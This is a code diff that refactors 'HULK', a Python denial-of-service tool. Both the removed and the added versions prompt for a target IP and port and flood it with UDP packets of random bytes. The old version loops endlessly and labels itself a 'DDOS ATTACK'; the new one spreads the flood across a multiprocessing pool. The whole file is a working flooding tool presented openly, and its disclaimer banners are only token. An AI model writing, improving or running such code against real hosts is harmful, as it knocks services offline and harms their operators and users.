@@ -1,93 +1,87 @@
-#Lets import modules
-import sys
 import os
-import time
 import socket
-import scapy.all as scapy
 import random
-import threading
-from django.core.validators import URLValidator
-from django.core.exceptions import ValidationError
-
-validate = URLValidator()
-
-#Lets start coding
+import sys
 from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+from multiprocessing import Pool, cpu_count
 
-#Lets define sock and bytes
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("clear")
-#Banner :
-print('''
+def print_banner():
+    print('''
     ************************************************
     *            _  _ _   _ _    _  __             *
     *           | || | | | | |  | |/ /             * 
     *           | __ | |_| | |__| ' <              *
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
-    *          HTTP Unbearable Load King           *
+    *          HTTP UNBEARABLE LOAD KING           *
     *          Author: Sumalya Chatterjee          *
     *                                              *
     ************************************************
     ************************************************
     *                                              *    
-    *  [!] Disclaimer :                            *
-    *  1. Don't Use For Personal Revenges          *
-    *  2. Author Is Not Responsible For Your Jobs  *
-    *  3. Use for learning purposes                * 
-    *  4. Does HULK suit in villain role, huh?     *
-    ************************************************
-	''')
-#Type your ip and port number (find IP address using nslookup or any online website) 
-ip = input(" [+] Give HULK A Target IP : ")
-port = eval(input(" [+] Starting Port NO : "))
-os.system("clear")
-print('''
-    ************************************************
-    *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
-    *           |_||_|\___/|____|_|\_\             *
+    *  [!] WARNING:                               *
+    *  UNAUTHORIZED USE OF THIS SOFTWARE           *
+    *  FOR MALICIOUS PURPOSES MAY RESULT          *
+    *  IN SEVERE LEGAL CONSEQUENCES.              *
     *                                              *
-    *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
-    *                                              *
+    *  HULK SMASH THOSE WHO ABUSE POWER!          *
     ************************************************
+    ''')
 
-	''')
-try:
-	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
-except ValidationError as exception :
-	print(" ✘ Input a right url")
+def initialize_attack():
+    os.system("clear")
+    print_banner()
+    print(" [+] HULK SMASH! PROVIDE A TARGET IP! 💥")
+    ip = input(" [+] TARGET IP: ")
+    port = int(input(" [+] STARTING PORT NO: "))
+    return ip, port
 
-#Lets start our attack
-print(" ")
-print("    That's my secret Cap, I am always angry ")
-print(" " )
-print(" [+] HULK is attacking server " + ip )
-print (" " )
-time.sleep(5)
-sent = 0
-try :
- while True:
-		sock.sendto(bytes, (ip, port))
-		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
-except KeyboardInterrupt:
-	print(" ")
-	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
-input(" Enter To Exit")
-os.system("clear")
-print(" [-] Dr. Banner is tired...")
+def validate_ip(ip):
+    try:
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        print(" [x] HULK ANGRY! INVALID IP ADDRESS. PROVIDE A VALID IP! 😡")
+        return False
+
+def send_packet(args):
+    ip, port = args
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        try:
+            bytes = random._urandom(random.randint(100, 2000))  # Randomize packet size
+            sock.sendto(bytes, (ip, port))
+            return True
+        except Exception as e:
+            print(f" [!] HULK ANGRY! ERROR: {e} 😡")
+            return False
+
+def send_packets(ip, port):
+    total_packets = 10000  # Total packets to send
+    batch_size = 1000  # Number of packets to send per batch
+    packets_sent = 0
+    print(" [+] HULK READY! SMASHING TARGET! 💢")
+    try:
+        while packets_sent < total_packets:
+            batch = min(batch_size, total_packets - packets_sent)
+            args_list = [(ip, port)] * batch
+            results = pool.map(send_packet, args_list)
+            packets_sent += sum(results)
+            print(f" [+] Packets Sent: {packets_sent}/{total_packets} 😠")
+    except KeyboardInterrupt:
+        print("\n [!] HULK ANGRY! INTERRUPT DETECTED... ABORTING 😡")
+        print(" [-] ATTACK TERMINATED")
+
+def main():
+    ip, port = initialize_attack()
+    if validate_ip(ip):
+        send_packets(ip, port)
+    else:
+        print(" [x] HULK ANGRY! ABORTING ATTACK. 😡")
+
+    input(" [+] PRESS ENTER TO EXIT")
+    os.system("clear")
+    print(" [-] HULK TIRED... 😡")
+
+if __name__ == "__main__":
+    pool = Pool(processes=cpu_count())
+    main()
